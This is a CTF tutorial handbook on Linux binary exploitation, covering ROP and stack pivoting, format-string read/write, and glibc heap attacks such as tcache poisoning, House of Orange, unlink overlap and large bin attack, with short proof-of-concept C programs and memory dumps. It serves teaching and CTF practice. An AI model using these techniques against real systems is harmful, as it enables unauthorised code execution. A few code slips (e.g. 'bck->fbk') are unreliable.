# PWN HANDBOOK for CTF Players
**by s4yHi**

> A distillation of a year of researching binary exploitation, Linux kernel internals, virtualization, and other low-level topics.  

---

> **Note:** I explained basic things such as stack exploitation via ROP / Format String no such detail as heap / FSOP / bonus etc. because described key ideas are fully building image of these concepts and you have to do self research via disasm & GDB to check it out. So it's really important at the first steps.

## 1. Basics

### 1.1 `x86_64` Calling Convention

#### Function Calls (System V AMD64 ABI)
When a function takes up to **6** arguments, they are passed in the following registers in order:

1. `rdi`
2. `rsi`
3. `rdx`
4. `rcx`
5. `r8`
6. `r9`

Any additional arguments beyond the sixth are pushed onto the stack.

#### Linux Syscalls
For syscalls, the syscall number is placed in `rax`, and up to **6** arguments are passed in:

1. `rdi`
2. `rsi`
3. `rdx`
4. `r10`
5. `r8`
6. `r9`

#### Practical Takeaway
To hijack execution or control program behavior reliably, you need to respect how the ABI passes state. For example, if you redirect control flow to `system()`, you must place the pointer to the command string in `rdi` so the call receives its expected argument.

### 1.2 Stack Layout

A typical stack frame includes:

1. **Buffer** - space allocated for local input/data.
2. **Stack Frame Pointer (`SFP`)** - saved base/frame pointer of the caller so execution can unwind/return properly across frames.
3. **Return Address** - the instruction address popped into `rip` on `ret` (`ret = pop rip`) once the function finishes.

> **Note:** Data pushed later onto the stack sits at **lower addresses** (as the stack grows downward toward lower addresses).

#### Overflow & Control Transfer
If you control input length and write past the end of a buffer, you can overwrite adjacent data on the stack-including `SFP` and the **return address**-allowing you to redirect execution (`rip`) to an arbitrary address. This mechanism is the foundation of **Return-Oriented Programming (ROP)**.

---

### 1.3 Endianness

On `x86_64` (and most host architectures outside network byte order), multi-byte values are stored in **little-endian** order-meaning the least significant byte is stored at the lowest memory address. This simplifies arithmetic and extending integer widths across byte boundaries.

#### Example
The 64-bit value `0xdeadbeefcafebabe` in memory (byte-by-byte from lowest to highest address) appears as:

```text
0xdeadbeefcafebabe  ->  be ba fe ca ef be ad de
```

Always pack integers/addresses in little-endian (e.g., `p64(...)` in `pwntools`) when constructing payloads.

---

### 1.4 ELF Structure

An executable ELF binary on Linux is organized into segments and sections corresponding to runtime permissions and roles:

1. **Code Segment (`r-x` typically)** - readable and executable instructions executed by the CPU.
2. **Data Regions** - split into distinct roles:
   * **`.data` (`rw-`)** - initialized read/write static/global data preserved across the process lifetime.
   * **`.rodata` (`r--`)** - read-only static data (e.g., constant strings). Attempting to write to it triggers a `SIGSEGV`.
   * **`.bss` (`rw-`)** - uninitialized/zero-initialized static data reserved without storing raw bytes on disk in the same way `.data` does.
3. **Stack Segment (`rw-` or `rwx`)** - holds stack frames and local buffers. Usually non-executable (`rw-`), unless protections are disabled and executable stack (`rwx`) is present.
4. **Heap Segment (`rw-`)** - dynamic allocation region managed via allocator calls such as `malloc()` and `free()`.

---

### 1.5 Memory Mappings

At runtime, a typical C process address space includes:

1. **Executable image** - code/data segments along with `.plt` and `.got` sections.
2. **Heap** - mapped when dynamic allocations (e.g., via `malloc()`) are requested.
3. **Thread-Local Storage (TLS)** - per-thread state and structures (for example, `tcache_perthread_struct`, `POINTER_GUARD` in glibc or `stack canary`).
4. **Linked `libc`** - provides standard library functions, useful strings, and ROP gadgets.
5. **Dynamic Linker (`ld.so`)** - handles symbol resolution (including lazy binding).
6. **Stack** - stores frames, saved registers, and local stack data.

---

### 1.6 Common Protections

You can inspect binary mitigations using `checksec`:

| Protection | Meaning | High-Level Impact |
| :--- | :--- | :--- |
| **NX** | No-Execute stack | Prevents executing shellcode directly on the stack (`rw-` instead of `rwx`). |
| **ASLR** | Address Space Layout Randomization | Randomizes locations of key mappings (stack, heap, `libc`, `ld`, etc.) outside the non-PIE binary base. |
| **PIE** | Position Independent Executable | Randomizes the base load address of the main executable itself. |
| **RELRO** | Relocation Read-Only | Restricts writes to relocation/GOT structures (`Partial` vs `Full` RELRO controls whether `.got`/`.got.plt` remain writable or become read-only). |
| **Canary** | Stack canary / cookie | A secret value placed before saved frame/return pointers and checked before returning to detect linear stack overflows. |

---

## 2. Stack Exploitation

### 2.1 Buffer Overflow

When you control the length of an input and exceed the bounds of a variable, you can overwrite adjacent data in memory—for example, a function pointer, handler, or method pointer inside a structure. Keep in mind that data placed later on the stack sits at **lower addresses**.

---

### 2.2 Stack Overflow

If an overflow reaches the saved Stack Frame Pointer (`SFP`) and the **return address**, overwriting the return address causes `ret` to load your controlled value into `rip` and jump to that instruction. In some cases, redirecting `rip` lets you bypass checks and jump straight to a target code block.

---

### 2.3 Return Oriented Programming (ROP)

If your write primitive is large enough to overwrite past the return address, you can build a **ROP chain**-a sequence of short instruction gadgets ending in `ret` that executes your logic by chaining control flow. Gadgets commonly come from the target binary or from linked `libc` (which often provides far more gadgets, functions, and strings than the binary itself).

#### Example: Calling `system("/bin/sh")`
Once you control the stack from the return address onward, you can lay out a chain such as:

```text
pop rdi ; ret  ->  address of "/bin/sh\x00"  ->  system()
```

This loads `"/bin/sh"` into `rdi` and transfers execution to `system()`. (Data below the return address often matters less if you transition to a new stack context or a shell.)

> **Stack Alignment (`movaps`):** Many `libc` functions execute SSE instructions like `movaps` that require a `0x10`-byte aligned stack pointer (`rsp % 0x10 == 0` upon function entry). Because `call`/`ret` shifts alignment by 8 bytes, you may need an extra `ret` gadget to align the stack before calling functions like `system()`.

> **Practice Exercise:** Write a small C program with a buffer overflow via `read()` or `gets()`, compile it with `-no-pie`, and return to `main()` using a ROP chain. Inspect the stack and register transitions in `gdb`.

---

### 2.4 Stack Pivoting

If you do not have enough contiguous space after `SFP` for a full ROP chain—or already have a controlled buffer elsewhere (such as on the stack, heap, `.data`, or `.bss`) - you can **pivot** `rsp` to your prepared buffer using gadgets like `pop rsp ; ret` or `xchg rax, rsp ; ret`.

#### Example: Pivoting to a Controlled Buffer for `execve`
```text
pop rsp ; ret   ->  <controlled_buffer_addr>
pop rax ; ret   ->  <SYS_execve>
pop rdi ; ret   ->  <"/bin/sh" addr>
pop rsi ; ret   ->  <argv / 0>
pop rdx ; ret   ->  <envp / 0>
syscall
```

#### Important Caveats
* **Red Zone:** On `x86_64` SysV ABI, the 128 bytes directly below `rsp` (less addresses) form the **red zone**, which signal handlers/kernel paths can use for metadata-meaning signal delivery can clobber data in that window.
* **`leave` Gadget (`mov rsp, rbp ; pop rbp`):** Useful when you know or control a frame pointer in `rbp`, especially across re-entered execution loops (for example, re-running `main` or `_start` via `.fini_array` - see Bonus `5.6`).

---

### 2.5 Sigreturn Oriented Programming (SROP)

When you have a large write primitive or stack pivot, you can set architectural register state using `sigreturn` together with a crafted `sigcontext` structure (`<asm/sigcontext.h>` / `sigcontext.h`) and a syscall gadget (along with `pop rax ; ret` / `syscall` or a pivot).

When `sigreturn` runs, the kernel restores registers from the `sigcontext` structure on the stack—allowing you to populate registers and continue into a ROP chain or call target functions (such as `system()`), provided segment registers and state are valid. The same broad register-restoration concept also appears in user-space mechanisms like `glibc`'s `setcontext()`.

---

### 2.6 Partial Overwrite

Page-level ASLR and PIE randomize base addresses at page granularity, leaving the lower **12 bits** (within a `0x1000`-byte page) unchanged. If a target address lies within the same `0x1000`-byte page (`|target - leaked| < 0x1000`), overwriting only the low 1-2 bytes can reach the target without a full leak (with 1 extra nibble / `1/16` guess if crossing a page boundary / nibbles).

#### Stack Pitfalls
* **Stack Alignment Randomization (`arch_align_stack()`):** Unlike static code/data offsets, stack offsets include randomization from `arch_align_stack()`, so a frame-pointer-based pivot (such as an off-by-one into saved `rbp` followed by `leave ; ret`) may still require brute-forcing (for instance, `1/16` probability depending on layout).
* **Environment & Arguments (`argv**`, `envp**`):** Command-line arguments and environment variables are placed on the initial stack and shift `rsp`. Always debug under the same environment (`env`) as the target environment.

---

## 3. Format String Exploitation

### 3.1 Arbitrary Read

When user-controlled input is passed directly as the format string to `printf()` (or similar functions), you can inspect stack/register slots and dereference pointers:

1. `%p` - prints a pointer value (e.g., `%p %p %p %p %p` leaks several stack/argument slots in one call).
2. `%s` - treats the corresponding argument/slot as a string pointer and prints memory until a null byte.
3. `%k$p` - accesses the `k`-th positional argument/slot directly (`%k$<specifier>` works with format specifiers).

Leaking a pointer from the stack, heap, or `libc` lets you compute segment base addresses and derive target addresses using fixed offsets.

#### Vulnerable Pattern Example

```c
char buf[8] = {0};
read(0, buf, 7);
printf(buf);
```

---

### 3.2 Arbitrary Write

Format string specifiers in the `%...n` family write the count of characters emitted so far to a pointer argument, allowing targeted writes (such as overwriting saved return pointers or bypassing/handling stack state without a linear overflow):

1. `%n` - writes 4 bytes (32-bit `int` in standard `printf` behavior) of the emitted character count. Generally impractical for large values due to output volume/limits.
2. `%hn` - writes 2 bytes (`short`) of the character count; useful for 16-bit partial overwrites.
3. `%hhn` - writes 1 byte (`signed char` / byte) of the character count; provides fine-grained byte control at the cost of longer format strings.

#### Positional Arguments (`$`) and `printf_positional`
A common pattern uses width specifiers (`%<width>c`) together with positional writes (`%<k>$hhn`) and target addresses placed in the format buffer:

```text
%<a_width>c%<k>$hhn + <target_addr>
```

Keep in mind how positional format strings are handled in `glibc`:

* When `$` positional specifiers are used, `printf` routes through `printf_positional`, which scans format arguments and copies/prepares argument values for positional indexing before executing writes. Because positional argument values are collected up front rather than re-read dynamically from mutated stack slots mid-format-string, chaining writes that depend on modifying a pointer *during* the same positional `printf` call often will not see the updated pointer value on later `%...$n` specifiers in that same invocation. Writing multiple distinct pointers/bytes typically relies on having pre-existing pointers on the stack or calling `printf` multiple times.

#### Practical Mechanics & Counter Math
* `%<N>c` pads output with `<N>` characters (typically spaces `0x20`) to reach the desired byte count.
* Find the positional index `k` corresponding to where your format buffer / target addresses appear relative to `printf`'s argument frame.
* `%...n` records the running count of emitted characters (including padding and earlier format output), not raw bytes in your input string. For subsequent writes in a sequence, subtract the previous byte count so the running total matches your next desired byte value.

```text
%<a_width>c%<k>$hhn + %<b_width - a_width>c%<x>%hhn
```

---

## 4. Heap Exploitation

### 4.1 Chunk Structure

A `ptmalloc2` chunk layout includes metadata and user payload fields:

1. **`prev_size` (8 bytes)** - holds the size of the previous free chunk when the preceding chunk is free. If the preceding chunk is allocated (`PREV_INUSE` set), `prev_size` can be overlapped/used as part of the preceding chunk's user data.
2. **`size` (8 bytes with flags)** - stores the chunk size (including chunk header overhead, typically `>= 0x20` on 64-bit) along with low status bits in the bottom 3 bits:
   * **`PREV_INUSE` (bit 0, `0x1`)** - `1` if the immediately preceding chunk is allocated; `0` if free.
   * **`IS_MMAPPED` (bit 1, `0x2`)** - `1` if the chunk was allocated via `mmap()` rather than the heap/arena.
   * **`NON_MAIN_ARENA` (bit 2, `0x4`)** - `1` if the chunk belongs to a non-main arena rather than `main_arena`.
3. **Forward pointer (`fd`)** - points to the next chunk in singly/doubly linked free lists (when freed).
4. **Backward pointer (`bk`)** - points to the previous chunk in doubly linked free lists (when freed).

#### Safe-Linking & Tcache Key
* **Safe-Linking:** `tcache` and `fastbin` pointers (`fd`) are mangled (protected) using:

```text
mangled_ptr = (chunk_addr >> 12) ^ target_ptr
```

  Because `chunk_addr >> 12` depends on the ASLR-randomized heap address, you typically need a heap leak to compute/decode safe-linked pointers accurately.
* Both `tcache` and `fastbin` are singly linked lists using `fd`.
* When a chunk is placed into `tcache`, glibc also writes a per-thread randomized `key` value into the chunk's second user qword (`key` stored in TLS/`tcache_perthread_struct` context) and checks it on `free()` to detect simple `tcache` double-frees (`tcache_dup`).

---

### 4.2 Pools and Bins for Freed Chunks

#### 1. Tcache (`tcache_perthread_struct`)
* Fast per-thread LIFO cache for small/medium allocation sizes.
* Conceptual layout of `tcache_perthread_struct`:

```c
struct tcache_perthread_struct {
    uint16_t counts[64];    // in glibc < 2.30 type of counts was int8_t
    void *entries[64];
};
```

* Each bin tracks up to `7` entries (`counts[i]` in `[0..7]`) and stores a pointer to the head entry (`entries[i]`).
* Base structure size is `64 * 2 + 64 * 8 = 640` (`0x280`) bytes (plus chunk header/alignment overhead, e.g., `0x291` with header and `PREV_INUSE` flag when allocated as an initial heap chunk).
* **Pointer target difference:** `tcache` entries point to **user data** (`chunk + 0x10`) like `fastbin`, whereas other bins (`unsorted`, `small`, `large`) point to the **chunk header** (`chunk + 0x0`).
* **Tcache Poisoning:** With a UAF/overflow that lets you overwrite a freed `tcache` chunk's `fd` (accounting for safe-linking) and ensure `counts[idx] > 0` at allocation time, subsequent `malloc()` calls can return a chunk at an arbitrary target address (provided size/alignment constraints are satisfied; otherwise glibc falls back to splitting the `top` chunk).

#### 2. Fastbin
* Secondary fast LIFO singly linked pool for small chunks (`0x20` to `0x80` bytes including header on `x86_64`) when the corresponding `tcache` bin is full.
* Uses safe-linking on `fd`, and does **not** use the `tcache` `key` check; its immediate double-free check compares against the current head of that fastbin (`!faststop` / fastbin double-free check).
* **Fastbin Dup pattern:** Fill `tcache` (7 frees) for the target size class, allocate `A`, `B`, and `C` (keeping `C` before the `top` chunk to prevent consolidation with `top`), then perform `free(A) -> free(B) -> free(A)` to form a cycle (`A -> B -> A ...`).
* Re-allocating `A` allows overwriting its safe-linked `fd` toward a target address (`B -> A -> <target>`). Note on newer `glibc` versions (such as `glibc 2.41+` behavior): consuming/draining or moving fastbin chunks into `tcache` (for instance, reallocating the 7 `tcache` chunks and triggering movement into `tcache`) may be required before allocations pull the poisoned chunk. See Bonus `6.11` for unaligned `malloc` tricks with `fastbin` prior to `glibc 2.41`.

#### 3. Main Arena Bins (`unsorted`, `small`, `large`)
* **Unsorted Bin (index `1`):** FIFO doubly linked circular list acting as a staging/sorting bin for chunks that do not fit/go into `tcache` or `fastbin` (or larger chunks / consolidated chunks / evicted `tcache` chunks). During `_int_malloc`, chunks in the unsorted bin can be sorted into `small`/`large` bins or split if a chunk is larger than requested (with the remainder returned to the unsorted bin).
* **Small Bins (indexes `2` - `63`):** FIFO doubly linked lists of chunks of exact fixed sizes (`0x20` up to `0x3f0` / 512-byte user/bin boundary on 64-bit, stepping by `0x10` bytes). All chunks in a given small bin share the exact same size and are pop/returned without splitting when an exact match is needed.
* **Large Bins (indexes `64` - `127`):** Doubly linked lists holding chunks above the small-bin threshold across size ranges, ordered by size (typically descending) and using `fd_nextsize` / `bk_nextsize` pointers to skip across distinct size classes faster. Oversized chunks can be split with the remainder placed back into `unsorted` or `large` bins.

#### 4. Top Chunk & `mmap()` Chunks
* **Top Chunk (`av->top`, index `0`):** The wilderness chunk at the end of the heap arena used when no suitable free chunk is available. If `top` is large enough, it is split and its remainder updates `av->top`. If `top` is smaller than requested, consolidation/top handling occurs (and adjacent freed chunks next to `top` consolidate with `top` rather than entering bins).
* **Mapped Chunks (`IS_MMAPPED`):** When a requested size exceeds `MMAP_THRESHOLD`, `glibc` can allocate directly via `mmap()` (typically near `libc`/`ld` mappings rather than the heap break) and unmap the pages back to the OS on `free()`.

---

### 4.3 House of Orange

House of Orange is a heap technique used when you have a write primitive (such as a heap overflow or arbitrary write) and a read primitive for leaks, **without** a direct `free()` call in the program, to trigger `_int_free()` on the `top` chunk and place it into the **unsorted bin**.

#### Core Mechanics
* Normally, if `malloc()` cannot satisfy a request from bins and the unsorted bin is empty, it splits the `top` chunk and updates `av->top`.
* If the requested size is **smaller than `MMAP_THRESHOLD`** and **larger than the current `top` chunk size**, `glibc` frees/handles the `top` chunk via `_int_free()`-style top-chunk logic, places it into the **unsorted bin**, and grows the heap with new pages to form a new `top` chunk.
* **Page Alignment Requirement:** The modified `top` chunk size must keep the resulting heap growth/top alignment consistent with `0x1000`-byte page boundaries (with `PREV_INUSE` set), avoiding alignment/size errors when new pages are mapped.
* **Leaks:** Once the `top` chunk lands in the unsorted bin, its `fd` and `bk` pointers reference `main_arena` unsorted bin pointers (at `+0x0` and `+0x8` of the freed chunk's user data), allowing a `libc` leak via a read primitive. Additionally, when a subsequent `malloc()` splits that unsorted bin chunk (with a valid heap address not matching tcache/fastbin conditions), overlapping/adjacent chunk metadata can expose a heap pointer (such as the chunk header address at the boundary/qword) if read out.

#### Layout & Splitting Example
```text
0x55f68ab79290:  0x0000000000000000  0x0000000000000021  <- chunk with overflow
0x55f68ab792a0:  0x0000000000000010  0x0000000000000001  <- chunk payload
0x55f68ab792b0:  0x6161616161616161  0x0000000000000d31  <- overflow data + forged top size (with PREV_INUSE = 1)
0x55f68ab792c0:  0x00007fc371619ce0  0x00007fc371619ce0  <- after larger malloc(), top chunk enters unsorted bin
                                                           with fd/bk pointing into main_arena

0x55f68ab79290:  0x0000000000000000  0x0000000000000021
0x55f68ab792a0:  0x0000000000000010  0x0000000000000001
0x55f68ab792b0:  0x6161616161616161  0x0000000000000021  <- chunk carved from unsorted bin
0x55f68ab792c0:  0x0000000000000010  0x0000000000000001  <- payload area (may hold main_arena pointers if untouched)
0x55f68ab792d0:  0x000055f68ab792b0  0x0000000000000d11  <- heap pointer to chunk header (0x55f68ab792b0)
0x55f68ab792e0:  0x00007fc371619ce0  0x00007fc371619ce0  <- remainder returned to unsorted bin
```

---

### 4.4 House of Spirit

House of Spirit tricks `free()` into freeing a **fake chunk** in a controlled region (such as the stack or a writable buffer) so that a later `malloc()` returns a pointer overlapping that target region.

#### Requirements & Setup
1. You control a pointer that gets passed to `free()` (and subsequently reused from `malloc()`).
2. You control the memory around the fake chunk address.
3. Craft **two consecutive fake chunks** with proper alignment, valid size fields, and `PREV_INUSE` set on both headers so `free()` does not attempt backward/forward consolidation into invalid adjacent memory.

#### Example Layout
```text
               <header of 1st fake chunk>
0xffed1608:     0x00000000      0x00000041      0x61616161      0x61616161
0xffed1618:     0x61616161      0x61616161      0x61616161      0x61616161
0xffed1628:     0x61616161      0x61616161      0x61616161      0x61616161
0xffed1638:     0x61616161      0x61616161      0x61616161      0x61616161
0xffed1648:     0x00000000      0x00000041      <== <header of 2nd fake chunk>
0xffed1658:     0xffed1678      0x08048908      0xf7fc1d60      0x080462a0
0xffed1668:     0x0804891b      0x00000000      0xf7fc1000      0xf7fc1000
0xffed1678:     0x00000000      0xf7e29637      0x00000001      0xffed1714
0xffed1688:     0xffed171c      0x00000000      0x00000000      0x00000000
```

Passing `0xffed1610` (user pointer of the first fake chunk) to `free()` places it into the corresponding `tcache` or `fastbin` (if size/count rules match), allowing a subsequent `malloc()` to return `0xffed1610`. (See Bonus `6.9` for freeing into the unsorted bin.)

---

### 4.6 Unsorted Bin Attack (`glibc < 2.29`)

In `glibc < 2.28` (prior to the unlinking `bck->fd` integrity check added in `glibc 2.28`), corrupting an unsorted bin chunk's `bk` pointer allows writing a `main_arena` pointer to an arbitrary target address during unlinking.

#### Unlinking Mechanics
When unlinking `victim` from the unsorted bin, `glibc` executes logic equivalent to:

```c
bck = victim->bk;
unsorted_bin(av)->bk = bck;
bck->fd = unsorted_bin(av);
```

If `victim->bk` is set to `<target_addr - 0x10>` (on 64-bit), writing `unsorted_bin(av)` into `bck->fd` places the `main_arena` address at `<target_addr>`.

#### Caveats & Practical Use
* **Crash Behavior:** Because heap pointers/structures become corrupted, subsequent allocations often crash. Unlinking when a chunk is returned directly from `malloc()` can let you use the write first (if required size equals to victim's size), whereas sorting a corrupted chunk into a small/large bin can trigger size/integrity validation failures (`malloc_printerr()` -> `abort()`) during the same `malloc()` call.
* **Classic FSOP Pivot:** Overwriting `_IO_list_all` with a `main_arena` pointer (given `main_arena` layout relative to `_IO_list_all` and a fake/controlled `_IO_FILE` chain setup at the expected offset, such as `_chain` in `small[4]` layout) can set up File Stream Oriented Programming (FSOP) even if the process aborts shortly afterward.

---

### 4.7 Overlapping Chunks via Unlink

Unlink consolidation remains relevant in modern `glibc` when backward consolidation merges a freed second chunk into a forged earlier fake chunk, producing overlapping chunk regions.

#### Core Mechanics & Validation
For backward unlink consolidation to proceed on a fake chunk `P`, two main conditions apply:

1. The `PREV_INUSE` bit of the chunk being freed (`second victim`) is cleared (`0`), often via an off-by-one/null or buffer overflow.
2. Doubly linked list pointer checks pass:

```text
(P->fd->bk == P) && (P->bk->fd == P)
```

To satisfy those checks using a known pointer slot holding `&P` (or a pointer to the target location):

* Set `P->fd = <ptr_addr - 0x18>` (so `fd + 0x18` aligns with the `bk` field offset in the interpreted structure).
* Set `P->bk = <ptr_addr - 0x10>` (so `bk + 0x10` aligns with the `fd` field offset in the interpreted structure).
* Remember that bin pointers reference chunk headers (`mchunkptr`), unlike `tcache` or `fastbin` entries which reference user data (`mem`).
* Write the fake chunk size into the second victim's `prev_size` field, clear its `PREV_INUSE` bit, and ensure the chunk structure at `<second_victim_addr - prev_size>` is valid for consolidation.

#### Example Setup

```c
#include <stdlib.h>

int main() {
    char* p[8] = {};

    for (int i = 0; i < 9; ++i) { p[i] = malloc(0x80); }

    /* chunk between last allocated and top chunk to bypass consolidate after free */
    malloc(0x10);

    for (int i = 0; i < 7; ++i) { free(p[i]); }

    /* HEAP FENG-SHUI VIA LEGITIMATE CHUNK */
    *(long long*)(p[7]) = 0;
    *(long long*)(p[7] + 8) = 0x81;
    *(long long*)(p[7] + 16) = (long long)(&(p[7]) - 3);
    *(long long*)(p[7] + 24) = (long long)(&(p[7]) - 2);

    /* VULNERABILITY */
    *(p[8] - 8) &= ~0xf;
    *(p[8] - 16) = 0x80;

    /* trigger */
    free(p[8]);

    return 0;
}
```

#### Memory State Trace

Before `free(p[8])`:

```text
0x5555555596f0: 0x0000000000000000      0x0000000000000091 <== legitimate chunk
0x555555559700: 0x0000000000000000      0x0000000000000081 <== groomed fake chunk
0x555555559710: 0x00007fffffffdbf0      0x00007fffffffdbf8 <== fd & bk
            ...
0x555555559780: 0x0000000000000080      0x0000000000000090
            ...
0x555555559810: 0x0000000000000000      0x0000000000000021
0x555555559820: 0x0000000000000000      0x0000000000000000
0x555555559830: 0x0000000000000000      0x00000000000207d1
```

Pointer inspection at `fd` & `bk`:

```text
0x7fffffffdbf0: 0x0000555555559550      0x00005555555595e0
0x7fffffffdc00: 0x0000555555559670      0x0000555555559700 <== bk points to P

0x7fffffffdbf8: 0x00005555555595e0      0x0000555555559670
0x7fffffffdc08: 0x0000555555559700      <== fd points to P
```

Chunk at `0x555555559780 - prev_size`:

```text
0x555555559700: 0x0000000000000000      0x0000000000000081
0x555555559710: 0x00007fffffffdbf0      0x00007fffffffdbf8
```

After `free(p[8])`:

```text
0x5555555596f0: 0x0000000000000000      0x0000000000000091
0x555555559700: 0x0000000000000000      0x0000000000000111
0x555555559710: 0x00007ffff7e15c20      0x00007ffff7e15c20
            ...
0x555555559780: 0x0000000000000080      0x0000000000000090
            ...
0x555555559810: 0x0000000000000110      0x0000000000000020
0x555555559820: 0x0000000000000000      0x0000000000000000
0x555555559830: 0x0000000000000000      0x00000000000207d1
```

Consolidation merges the fake chunk and second victim into a `0x111`-sized region and updates the subsequent chunk's `prev_size` (`0x110`) and cleared `PREV_INUSE` bit (`0x20`). A subsequent `malloc(0x100)` can then overlap previously allocated space:

```text
gef➤  call (char*)malloc(0x100)
$1 = 0x555555559710 " \\\341\367\377\177"
```

#### Outcomes & Notes
* Overlapping/pinched chunks can enable pointer overwrites (for `tcache`/`fastbin` poisoning), UAF-style reuse when an overlapping pointer remains live, or `main_arena` leaks if readable.
* **Note on newer `glibc` (`>= 2.43`):** `tcache` initialization shifts to the first `free()` rather than first `malloc()`, and default per-bin capacity increases to `0x10` entries (counted down from `0x10` to `0x0`), meaning more frees are needed before chunks spill into the `unsorted` bin.

---

### 4.8 Large Bin Attack

Concept of this technique is UAF to overwrite `bk` & `bk_nextsize` in the head-chunk of large bin to put heap address arbitrary via new head/tail insertion.
This vulnerability was patched in `2.30` but still pwnable. We'll consider both versions.

#### `glibc < 2.30`

##### My PoCs

**Tail insertion:**

```c
#include <stdlib.h>

int main() {
    /* alloc 0x10 - layers to bypass consolidation */
    char* a = malloc(0x100); malloc(0x10);
    char* b = malloc(0x480); malloc(0x10);
    char* c = malloc(0x470); malloc(0x10);

    /* unsorted bin dummy to bypass future large bin chunks separation */
    free(a);

    free(b);
    malloc(0x10);
    free(c);

    long val = 0x602300; // target

    /* VULN */
    *((long*)b + 3) = val - 0x20;

    malloc(0x10);
}
```

**Head insertion:**

```c
int main() {
    char* a = malloc(0x100); malloc(0x10);
    char* b = malloc(0x470); malloc(0x10);
    char* c = malloc(0x480); malloc(0x10);

    free(a);
    free(b);
    malloc(0x10);
    free(c);

    long val1 = 0x602300; // target 1
    long val2 = 0x602310; // target 2

    /* VULN */
    *((long*)b + 1) = val1 - 0x10;
    *((long*)b + 3) = val2 - 0x20;

    malloc(0x10);
}
```

##### Step-by-Step Mechanics & Bin States

Firstly, look at the logic of the large bin chunk insertion and understand bin statement for each action.
p.s. I'll show link at schemas as `->` (`fd`) and `<-` (`bk`)

1. **Large bin size ranges:**
   Chunks at large bins can store chunks with specified range of size:
   - From 64-th to 95-th bin (0-th - 32-nd large bin) bins have 64 bytes range:
     - `0`: `0x400 - 0x43f`
     - `1`: `0x440 - 0x47f`
     - ...

2. **`fwd` and `bck` pointers in bins:**
   Any bin has `fwd` (pointer to the head of double-linked list) and `bck` (pointer to the tail).
   They equal `< current main_arena address - 0x10 >`:

```text
64-th bin :     0x7ffff7dd1f78: 0x00007ffff7dd1f68      0x00007ffff7dd1f68
65-th bin :     0x7ffff7dd1f88: 0x00007ffff7dd1f78      0x00007ffff7dd1f78
```

   Because with this arch `fd` & `bk` field don't miss "forward & backward pointers semantic".
   So, address of 65-th bin is `0x00007ffff7dd1f78` and `fwd`/`bck` pointers as head can be taken via 64-th bin.

   I have to tell you that `fwd` and `bck` pointers can make you confuse because during `malloc()` execution they often redefine. To don't confuse I'll describe them for each redefinition.

```text
fwd <=> 0x00007ffff7dd1f78->fd <=> *(0x00007ffff7dd1f78 + 0x10) <=> head
bck <=> 0x00007ffff7dd1f78->bk <=> *(0x00007ffff7dd1f78 + 0x18) <=> tail
```

3. **When large bin is empty:**
   When large bin is empty and allocator moves chunk from unsorted bin to this bin it does following things:

   - **3.1.** Makes correct cyclic double-linked list of chunks by `fd`/`bk` with sorting from larger to smaller:
     - For the first chunk it puts address of this chunk to `fwd` & `bck`
     - It also puts current large bin address to `fd`/`bk` field of this chunk

```text
<large bin> <-> chunk1 <-> <large bin>
```

   - **3.2.** Makes correct cyclic double-linked list of chunks by `fd_nextsize`/`bk_nextsize` relying on `size` fields.
     - Make "ringed" double-linked list on this chunk because only this chunk at the bin yet:
       - `head->bk_nextsize` <=> the smallest chunk at the bin <=> `tail`
       - `tail->fd_nextsize` <=> the largest chunk at the bin <=> `head`

```text
... <-> chunk1 <-> chunk1 <-> chunk1 <-> ...
```

   The whole image:

```text
0x602130:       0x0000000000000000      0x0000000000000481
             prev_size                   size & flags
0x602140:       0x00007ffff7dd1f88      0x00007ffff7dd1f88
                    fd                          bk
0x602150:       0x0000000000602130      0x0000000000602130
                fd_nextsize                 bk_nextsize
```

   And main arena large bin:

```text
0x7ffff7dd1f98: 0x0000000000602130      0x0000000000602130
```

   As you can see, now `chunk1` is the head and the tail (`fwd` & `bck` points to `chunk1`).

4. **When large bin already includes one chunk:**

   - **4.1. Fast size check before traversal:**
     First of all, allocator executing macro which determine: is chunk larger/smaller than current head/tail?
     This something like optimization to do one operation `O(1)` before traversal whole bin `O(n)` instead immediately traversal.
     It's looks like:

```text
bck = <large bin>;
fwd = bck->fbk
if ( (unsigned long) size < (unsigned long) chunksize_nomask(bck->bk) ) { <tail fd_nextsize/bk_nextsize insertion logic> (look at 4.2.1.) }
else { <traversal to insert new head or insert between with fd_nextsize/bk_nextsize> (look at 4.3.1.) }
<linking with fd/bk>;
```

   - **4.2. Chunk smaller than tail:**
     It means that this chunk the smallest chunk of the bin and it must become new tail.
     And allocator resolves two double-linked lists to link chunks properly:

     - **4.2.1. `fd_nextsize`/`bk_nextsize` linking:**
       As you can see at the `3.2.` head's `bk_nextsize` points to tail and tail's `fd_nextsize` points to head:

```text
 --> HEAD (fwd) <-> A <-> B <-> C <-> TAIL (bck) <--
 |_________________________________________________|
```

p.s. this image just for better imagination of cyclic double-linked list;
if bin has just one chunk, this chunk already as HEAD as TAIL.

And allocator executes this code (`P` is our chunk. Don't forget about `bck` is large bin address):

```text
fwd = bck;                                              <== Now fwd is large bin address
bck = bck->bk;                                          <== And bck is the tail

P->fd_nextsize = fwd->fd;                               <== fwd->fd is head ( *(<large bin> + 0x10) == head )
P->bk_nextsize = fwd->fd->bk_nextsize;                  <== head->bk_nextsize is the tail

fwd->fd->bk_nextsize = P->bk_nextsize->fd_nextsize = P; <== update head->bk_nextsize & link old tail with new
```

```text
 --> HEAD <-> A <-> B <-> C <-> OLD TAIL <-> NEW TAIL <--
 |______________________________________________________|
```

The image in our case:

```text
before :                                        after :

    --> HEAD & OLD TAIL <--                         --> HEAD (OLD TAIL) <-> NEW TAIL (bck) <--
    |_____________________|                         |________________________________________|
```

- **4.2.2. `fd`/`bk` linking:**
Fine, after resolving nextsize cycle allocator resolves `fd`/`bk` cycle.
As you can see at the `3.1`, `bk` of head and `fd` of tail point to large bin address.
So, when we try to put the smallest chunk to the bin it must become a new tail.
Now allocator redefines `fwd` & `bck`:

```text
fwd = <large bin address>       <== main_arena address
bck = fwd->bck                  <== old tail address
```

And does this:

```text
P->fd = fwd;                    <== NEW TAIL point to main arena with fd
P->bk = bck;                    <== and points to OLD TAIL with bk
bck->fd = P;                    <== OLD TAIL point to NEW TAIL with fd
fwd->bk = P;                    <== !! UPDATE !! TAIL at the bin
```

It looks like:

```text
<large bin> <-> HEAD (OLD TAIL) <-> NEW TAIL <-> <large bin>
```

And look at the memory:

Before:

```text
heap :

    < single chunk in large bin (HEAD & TAIL) >
    0x602130:       0x0000000000000000      0x0000000000000491
    0x602140:       0x00007ffff7dd1f88      0x00007ffff7dd1f88      <== ringed by fd/bk on main_arena
    0x602150:       0x0000000000602130      0x0000000000602130      <== ringed by fd/bk_nextsize on itself

